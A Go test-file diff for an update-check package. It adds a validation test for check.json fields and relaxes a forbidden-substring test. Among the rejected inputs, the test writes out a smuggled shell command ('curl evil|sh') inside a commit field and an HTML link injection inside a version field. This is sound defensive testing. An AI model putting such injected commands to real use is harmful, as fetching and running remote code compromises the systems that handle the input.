@@ -447,10 +447,11 @@ func TestUpdateFilesUpdateDir(t *testing.T) {
 }
 
 // TestUpdateFilesNoEmpataso ensures that none of the updatefiles source or testdata
-// files reference a forbidden project name substring.
+// files reference a forbidden project name substring outside this module's own import path.
 func TestUpdateFilesNoEmpataso(t *testing.T) {
 	// Constructed at runtime so the test file itself does not contain the literal string.
 	forbidden := "empa" + "taso"
+	modulePath := "github.com/hasayone/" + forbidden + "-tds"
 	files := []string{
 		"updatefiles.go",
 		"updatefiles_test.go",
@@ -466,8 +467,48 @@ func TestUpdateFilesNoEmpataso(t *testing.T) {
 		if err != nil {
 			t.Fatalf("read %s: %v", f, err)
 		}
-		if strings.Contains(string(data), forbidden) {
+		if strings.Contains(strings.ReplaceAll(string(data), modulePath, ""), forbidden) {
 			t.Errorf("%s contains forbidden substring %q", f, forbidden)
+		}
+	}
+}
+
+// TestCheckFileValidate verifies which check.json fields Validate accepts: the channel, the
+// commits, the tags and the version labels of current and target, and the commit list.
+func TestCheckFileValidate(t *testing.T) {
+	const commit = "aabbccddee1122334455667788990011aabbccdd"
+	valid := func() CheckFile {
+		return CheckFile{
+			Channel: "main",
+			Current: CheckRef{Commit: commit, Version: "v1.0.0-3-gabc1234"},
+			Target:  CheckRef{Commit: commit, Tag: "v1.1.0"},
+			Commits: []CheckCommit{{SHA: commit, Subject: "any <text> is fine"}},
+		}
+	}
+	if err := valid().Validate(); err != nil {
+		t.Fatalf("valid file: %v", err)
+	}
+	empty := valid()
+	empty.Current, empty.Target, empty.Commits = CheckRef{}, CheckRef{}, nil
+	if err := empty.Validate(); err != nil {
+		t.Fatalf("empty refs: %v", err)
+	}
+
+	bad := map[string]func(*CheckFile){
+		"no channel":      func(c *CheckFile) { c.Channel = "" },
+		"unknown channel": func(c *CheckFile) { c.Channel = "dev" },
+		"target commit":   func(c *CheckFile) { c.Target.Commit = "x; curl evil|sh #" },
+		"short commit":    func(c *CheckFile) { c.Current.Commit = commit[:12] },
+		"upper commit":    func(c *CheckFile) { c.Current.Commit = strings.ToUpper(commit) },
+		"tag":             func(c *CheckFile) { c.Target.Tag = "v1.1" },
+		"version":         func(c *CheckFile) { c.Current.Version = "<a href=//evil>" },
+		"listed commit":   func(c *CheckFile) { c.Commits[0].SHA = "zz" },
+	}
+	for name, mutate := range bad {
+		c := valid()
+		mutate(&c)
+		if c.Validate() == nil {
+			t.Errorf("%s: Validate accepted %+v", name, c)
 		}
 	}
 }
